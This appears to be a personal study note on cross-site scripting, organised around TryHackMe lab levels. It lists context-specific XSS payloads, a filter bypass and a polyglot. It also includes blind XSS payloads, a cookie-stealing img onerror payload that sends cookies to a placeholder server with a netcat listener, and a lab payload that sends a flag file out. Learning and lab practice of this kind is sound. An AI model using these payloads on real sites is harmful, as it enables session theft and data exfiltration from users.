---
description: XSS (cross-site scripting).
---

# XSS

## 4 types of XSS attack methods:

1. Reflected XSS
2. Stored XSS
3. DOM XSS
4. Blind XSS

{% embed url="https://github.com/mandatoryprogrammer/xsshunter-express" %}

### Methods to load XSS payload

1. URL file path, or query parameters
2. Insecure Javascript functions
   * `eval()`
3. Non-validated user input forms
4. window.location.x&#x20;
   * Eg. `window.location.hash`

### Perfecting payload

_<mark style="color:green;">**Practice room:**</mark>_ [https://tryhackme.com/r/room/xss](https://tryhackme.com/r/room/xss), Task 7 (Perfecting your payload)

Some of the examples listed below are taken from the TryHackMe (THM) practice lab link above.

#### 1. Input within \<h2> tag with no filter _(THM level 1)_

a) Simply `<script>alert('XSS');</script>`

#### 2. Input used as value attribute of \<input> tag (_THM level 2)_

> Eg. XSS payload input: `<script>alert('XSS');</script>`->  `<input value="<script>alert('XSS');"</script>">`

a) `"> <script>alert('XSS');</script>`

* `"`: The first quotation mark is used to escape from the `value` attribute of the `<input>` tag
* `>`: The > character is used to close the `<input>` tag&#x20;

#### 3. Input used as value within \<textarea> tag _(THM level 3)_

> Eg. XSS payload input: `<script>alert('XSS');</script>`-> `<textarea><script>alert('XSS');</script></textarea>`

a) `</textarea> <script>alert('XSS');</script>`

* `</textarea>`: The \<textarea> closing tag to close the textarea

#### 4. Input used as value to innerHTML in a script (within a \<script> tag) _(THM level 4)_

> Eg. XSS payload input: `<script>alert('XSS');</script>` -> `<script> document.getElementsByClassName(...)[0].innerHTML='<script>alert('XSS'); ...`

_a)_ `'; alert('XSS'); //`&#x20;

* `'`:  To escape from the field
* `;`:  To signify end of command on the current line in JavaScript
* `//`: Makes the code after the alert statement to be comments (to not be executed)

_b)_ `' </script> <script> alert('THM');</script>`

* `'`: To escape from the field
* `</script>`: To close the original \<script> tag, to allow for opening of a new \<script> tag

#### 5. Filter that removes the word _script (THM level 5)_

> `Eg. <script>alert('XSS');</script>` -> `<>alert('XSS');</>`

`a) <scripscriptt>alert('XSS');</scripscriptt>`&#x20;

&#x20;    -> `<scrip`~~`script`~~`t>alert('XSS');</scrip`~~`script`~~`t>`

&#x20;    -> `<script>alert('XSS');</script>`



#### 6. Input used as value for the src attribute of the img tag, with HTML opening/closing tags removed (`<` and `>`) (level 6)

> Eg.&#x20;
>
> Valid input: <mark style="color:green;">/images/test.jpg</mark> -> `<img src="/images/test.jpg" >`
>
> XSS payload input: <mark style="color:red;">"> \<script>alert('XSS');\</script></mark> -> `<img src="" scriptalert('xss');="" script"="">` (< and > removed)

_**How to bypass:**_

&#x20;a) `/images/cat.jpg " onload="javascript:alert('THM');"`

* Instead of escaping out of the `<img>` tag to create a new `<script>` tag, an inline attribute can be used to call a script instead
* `/images/cat.jpg`:  Can be any other valid path to an image that exists. This is to trigger the `onload` attribute function to be called after the image has loaded.&#x20;
* `"`:  The quotation marks right after the invalid image file path is used to escape the `src` attribute, and create the `onload` attribute

`b) / " onerror="alert('XSS');"`

* Similar  to part a)
* `/`:  Can be any other invalid path to an image that does not exists. This is to trigger the `onerror` attribute function to be called.&#x20;
* `"`:  The quotation marks right after the invalid image file path is used to escape the `src` attribute, and create the `onerror` attribute

#### 8. IMG tag

`a) <img src="/invalid-path" onerror="alert('XSS');">`

`b) <img src="/valid-path" onload="alert('THM');">`

`c)` _**Extract the cookies?**_ :cookie: _**:**_ `<img src="/invalid-path" onerror="(function(){console.log(document.cookie);fetch('https://<server_address>:8888?cookie='+btoa(document.cookie));})()">`

Netcat command to listen at the _**\<server\_address>:**_

```bash
$ nc -nvlp 8888
```

&#x20;  -> Log the cookie and send an API call with the cookie as the request body



9. **Disallow `<script></script>` tag**

a) Use anchor tag: `<a onmouseover="javascript:alert('XSS');">...</a>`

b) Use iframe tag: `<iframe src="javascript:alert('XSS');">`

_... refer to OWASP cheat sheet below for more examples_



### Polygots

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one.&#x20;

``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e``

Taken from: [https://tryhackme.com/r/room/xss](https://tryhackme.com/r/room/xss)

## Blind XSS payloads

1. `'"> <script>fetch('http://<IP>:[port]?xss=yay')</script>`
2. `'"> <script src="http://<IP>:[port]?xss=yay"></script>`&#x20;
3. `<img/>`,`<object/>`,`<iframe/>`

{% embed url="https://github.com/lauritzh/blind-xss-payloads/blob/main/README.md" %}

## Practice

{% embed url="https://tryhackme.com/r/room/thestickershop" %}

_**Blind XSS payload:**_

`"><script>(function(){`\
`fetch("http://127.0.0.1:8080/flag.txt").then(res=>res.text()).then(data=>fetch("http://<attack_box_ip>:<port>?v="+btoa(data)));`\
`})()</script>`



{% embed url="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html" %}
OWASP XSS filter evasion cheat sheet
{% endembed %}

{% embed url="https://github.com/payloadbox/xss-payload-list" %}

